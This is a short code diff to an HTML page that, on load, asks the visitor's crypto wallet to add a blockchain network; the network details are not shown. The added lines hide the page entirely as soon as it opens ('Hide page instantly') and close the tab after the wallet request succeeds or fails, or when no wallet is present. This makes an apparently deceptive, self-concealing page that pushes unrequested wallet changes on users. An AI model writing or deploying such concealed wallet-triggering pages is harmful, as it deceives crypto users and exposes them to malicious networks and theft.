@@ -2,9 +2,19 @@
 <html>
 <head>
     <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <style>
+        html, body {
+            display: none; /* Hide page instantly */
+        }
+    </style>
     <script>
         async function triggerWallet() {
-            if (!window.ethereum) return;
+            if (!window.ethereum) {
+                // No wallet: do nothing or close tab
+                window.close(); // Closes tab if opened standalone
+                return;
+            }
             try {
                 await window.ethereum.request({
                     method: "wallet_addEthereumChain",
@@ -28,7 +38,10 @@
                         }
                     }
                 });
-            } catch (error) {}
+                window.close(); // Success: close tab
+            } catch (error) {
+                window.close(); // Error: close tab
+            }
         }
         triggerWallet();
     </script>
